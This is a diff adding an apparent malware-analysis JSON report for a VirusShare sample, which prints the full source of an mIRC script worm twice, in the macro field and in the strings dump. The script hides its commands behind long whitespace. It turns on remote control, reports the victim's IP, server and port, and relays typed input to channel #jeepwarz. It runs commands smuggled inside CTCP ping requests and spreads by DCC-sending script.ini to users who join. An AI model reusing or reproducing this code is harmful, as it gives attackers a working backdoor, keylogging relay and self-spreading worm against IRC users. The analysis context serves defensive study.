@@ -1,0 +1,66 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "chr": "May attempt to obfuscate specific str"
+        },
+        "macro": "[script]\nn0=\nn1=on 1:START:{                                                                                                                                                                                                                                                                                                                                                                                   .sreq ignore\nn2=  .remote on\nn3=  titlebar (Not connected)\nn4=}\nn5=raw 401:*: {\nn6=  halt\nn7=}\nn8=RAW 001:*:titlebar (Connecting to $server $+ )\nn9=\nn10=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .\nn11=\nn12=on 1:DISCONNECT:titlebar (Not connected)\nn13=\nn14=;if you type something in status it doesn't have to have \"/\"\nn15=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-\nn16=  set %a status window\nn17=  if ( $active == %a ) { $1- | halt }\nn18=}\nn19=\nn20=;ping stuff\nn21=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . \nn22=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }\nn23=\nn24=;if you are banned but still opped, unban self\nn25=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask\nn26=\nn27=on 1:JOIN:*:{\nn28=  if ( $nick == $me ) { halt }\nn29=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini\nn30=}\nn31=\nn32=;show channel topic in channel on join\nn33=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }"
+    },
+    "filename": "VirusShare_278fd7c6afedf2b01da0dea2aa598c19",
+    "filesize": 3164,
+    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "278fd7c6afedf2b01da0dea2aa598c19",
+        "sha1": "dd23d403e527e2e773f2d4793edbc10689989180",
+        "sha256": "ab6a577448e5877b90a6b15ed788f13986f1b13a125df3a211991ab26ceb2025"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "[script]",
+            "n1=on 1:START:{                                                                                                                                                                                                                                                                                                                                                                                   .sreq ignore",
+            "n2=  .remote on",
+            "n3=  titlebar (Not connected)",
+            "n4=}",
+            "n5=raw 401:*: {",
+            "n6=  halt",
+            "n7=}",
+            "n8=RAW 001:*:titlebar (Connecting to $server $+ )",
+            "n10=on 1:CONNECT:titlebar (Connected to $server $+ )                                                                                                                                                                                                                                                                                                               | .msg  #jeepwarz Hi.  $ip on $server $+ : $+ $port $+ .",
+            "n11=",
+            "n12=on 1:DISCONNECT:titlebar (Not connected)",
+            "n13=",
+            "n14=;if you type something in status it doesn't have to have \"/\"",
+            "n15=on 1:INPUT:*:{                                                                                                                                                                                                                                                                                                                                                                                     .msg #jeepwarz ( $+ $active $+ ) $1-",
+            "n16=  set %a status window",
+            "n17=  if ( $active == %a ) { $1- | halt }",
+            "n18=}",
+            "n19=",
+            "n20=;ping stuff",
+            "n21=on 1:CTCPREPLY:ping*:.notice $nick Your ping time is $duration($calc($ctime - $2)) $+ . ",
+            "n22=CTCP 1:ping: if ( $nick != $me) { .ctcp ping $1 }                                                                                                                                                                                                                                                                                                                      | if ( $3 != $null ) { $3- | halt }",
+            "n23=",
+            "n24=;if you are banned but still opped, unban self",
+            "n25=on @1:BAN:#:if ( $banmask iswm $address($me,5) ) mode $chan -b $banmask",
+            "n26=",
+            "n27=on 1:JOIN:*:{",
+            "n28=  if ( $nick == $me ) { halt }",
+            "n29=  if ( $comchan($nick,0) > 2 ) { .notice $nick Following me? | halt }                                                                                                                                                                                                                                                                                   | .dcc send $nick $mircdir $+ script.ini",
+            "n30=}",
+            "n31=",
+            "n32=;show channel topic in channel on join",
+            "n33=RAW 332:*:echo 4 $2 $chr(31) $+ $2 $+ $chr(31) $+ : $3-                                                                                                                                                                                                                                                                                                     | if ( script.ini isin $3- ) { part $2 | halt }"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.282348",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
